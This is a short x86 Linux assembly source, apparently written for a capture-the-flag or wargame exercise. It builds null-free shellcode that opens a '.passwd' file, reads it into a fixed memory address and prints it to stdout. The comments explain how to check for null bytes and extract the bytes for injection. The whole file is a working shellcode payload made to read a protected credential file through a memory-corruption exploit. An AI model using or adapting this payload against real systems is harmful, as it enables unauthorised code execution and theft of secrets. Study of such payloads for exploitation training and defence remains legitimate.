;  nasm -f elf -o out.o readpw.s
; first check for nulls:
;  objdump -d out.o
; if you want to run:
;  ld -m elf_i386 -o out out.o
; or dump shellcode:
;  objcopy --output-target=binary --only-section=.text out.o shell.bin
; print shellcode as python bytes:
;  python -c "print(repr(open('shell.bin', 'rb').read())[2:-1])"

section .data
buf_addr equ 0x804a1c0

section .text
global _start
_start:

; open(".passwd", O_RDONLY = 0)
push 5
pop eax ; open

; push filename backwards on stack
; push 0x00647773 (\x00dws) but without null
push 0x647773AA
pop ebx
shr ebx, 0x8
push ebx

push 0x7361702e ; sap.

mov ebx, esp
xor ecx, ecx ; O_RDONLY
int 0x80 ; syscall


; read(3, buffer, 128)
mov ebx, eax ; fd from open()
push 3
pop eax ; read
mov ecx, buf_addr
push 127
pop edx ; n bytes
int 0x80 ; syscall


; write(1, buffer, %eax)
mov edx, eax ; len from read()
push 4
pop eax ; write
push 1
pop ebx ; stdout
mov ecx, buf_addr
int 0x80 ; syscall

; exit nicely
push 1
pop eax ; exit
xor ebx, ebx ; ret code = 0
int 0x80 ; syscall